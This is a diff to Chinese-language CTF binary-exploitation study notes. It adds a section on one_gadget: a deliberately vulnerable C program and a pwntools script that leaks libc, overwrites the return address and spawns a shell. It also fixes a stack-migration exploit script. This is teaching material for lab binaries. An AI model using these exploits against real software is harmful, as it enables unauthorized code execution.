@@ -168,6 +168,8 @@ Table of Contents
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
     * [介绍](#介绍-14)
+    * [one\_gadget](#one_gadget)
+    * [参考](#参考-13)
   * [stack migrate](#stack-migrate)
     * [介绍](#介绍-15)
     * [leave指令](#leave指令)
@@ -175,7 +177,7 @@ Table of Contents
       * [Exploit](#exploit-12)
     * [栈劫持](#栈劫持)
     * [实战](#实战-10)
-    * [参考](#参考-13)
+    * [参考](#参考-14)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -194,7 +196,7 @@ Table of Contents
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-14)
+    * [参考](#参考-15)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
     * [介绍](#介绍-17)
@@ -204,7 +206,7 @@ Table of Contents
     * [介绍](#介绍-18)
     * [安装](#安装-2)
     * [使用](#使用-1)
-  * [one\_gadget](#one_gadget)
+  * [one\_gadget](#one_gadget-1)
     * [介绍](#介绍-19)
     * [安装](#安装-3)
     * [使用](#使用-2)
@@ -226,7 +228,7 @@ Table of Contents
       * [分析](#分析-2)
       * [Exploit](#exploit-14)
     * [CVE\-2018\-1160](#cve-2018-1160)
-      * [参考](#参考-15)
+      * [参考](#参考-16)
     * [calc](#calc)
       * [分析](#分析-3)
     * [dubblesort](#dubblesort)
@@ -700,7 +702,7 @@ int main() {
 
 ![screenshots](Self-help_Clown.assets/screenshots-164906571707425.gif)
 
-aaaa和bbbb都打印出来了, '\x00'不可打印所以没有打印出来, '\n'截断, 所以'\n'开始都没有输入到buf中, 而且截断后不会在结尾插入任何东西(gets会在输入结尾插入'\x00')
+aaaa和bbbb都打印出来了, '\x00'不可打印所以没有打印出来, '\n'截断, 所以'\n'开始都没有输入到buf中, 而且截断后不会在结尾插入任何东西
 
 ### 参考
 
@@ -3659,7 +3661,67 @@ gdb调试来看一下, 在scanf处设下断点
 
 ### 介绍
 
+做题会遇到一种情况, 就是在做溢出的时候会不方便传递参数, 这时候就需要借助一种特殊的rop链, 它会自动传入参数, 然后去调用execve, 完成get shell的操作
 
+### one_gadget
+
+该种题型主要依靠ruby工具one_gadget来完成, 它的一个用法就是搜寻程序对应libc中的"execve("/bin/sh", 0, 0)"的rop链
+
+```sh
+$ one_gadget [libc]
+```
+
+>   可以去参考[one_gadget](#one_gadget)这篇用法
+
+以一道题来讲
+
+```c
+#include<stdio.h>
+int main() {
+    char buf[0x10];
+    printf("%llx", (long long int)&scanf);	// 泄露scanf真实地址
+    fflush(0);
+    scanf("%s", buf);
+    return 0;
+}
+// gcc one_gadget.c -o one_gadget -fno-stack-protector
+```
+
+这道题是scanf溢出, 而且没有添加canary保护, 所以可以直接覆盖函数返回地址, 按照平时的思想肯定想到的是ret2libc来做这道题, 但是仔细看的话会发现这道题用这个完全做不出来, 因为scanf存在'\x00'截断, x64地址都不满8个字节, p64打包肯定会添加'\x00', 这就导致最多用一次p64
+
+而用one_gadget刚好可以解决这里的问题: 只一次p64就可以getshell
+
+首先需要用one_gadget工具来找片段
+
+![image-20220410214749015](Self-help_Clown.assets/image-20220410214749015.png)
+
+随便选一个试一试
+
+```python
+from pwn import*
+o = process('./one_gadget')
+elf = ELF('./one_gadget')
+libc = elf.libc
+scanf_offset = libc.sym['__isoc99_scanf']
+scanf_addr = int(o.recv(12), 16)
+libc_base = scanf_addr - scanf_offset
+print hex(libc_base)
+one_gadget = libc_base + 0x4f2a5
+payload = 'a'*24 + p64(one_gadget)	# 覆盖函数返回地址为one_gadget
+o.sendline(payload)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16495986049991.gif)
+
+具体下断点gdb调试来看
+
+![screenshots](Self-help_Clown.assets/screenshots-16495988324653.gif)
+
+### 参考
+
+-   https://bbs.pediy.com/thread-261112.htm
+-   https://www.cnblogs.com/unr4v31/p/15173811.html
 
 ## stack migrate
 
@@ -3812,7 +3874,7 @@ elf = ELF('./migrate')
 printf_plt = elf.plt['printf']
 printf_got = elf.got['printf']
 start = 0x080483e0
-leave_ret = 0x8048538
+leave_ret = 0x8048538	# leave;ret指令地址
 
 o.recvuntil("buf: ")
 buf_addr = int(o.recv(10), 16)	# 接收buf地址
@@ -3860,7 +3922,7 @@ payload = p32(printf_plt)
 payload += p32(start)   # printf返回地址, 刷新栈
 payload += p32(printf_got)
 payload = payload.ljust(0x18, 'a') #填充到*ebp前的内存
-payload += p32(buf-4) # 因为pop ebp会弹一个栈帧, 所以要把这个地址往后一个栈帧
+payload += p32(buf_addr-4) # 因为pop ebp会弹一个栈帧, 所以要把这个地址往后一个栈帧
 payload += p32(leave_ret)
 o.sendline(payload)
 
@@ -3888,6 +3950,8 @@ o.interactive()
 过程还是挺简单的
 
 ### 栈劫持
+
+
 
 ### 实战
 
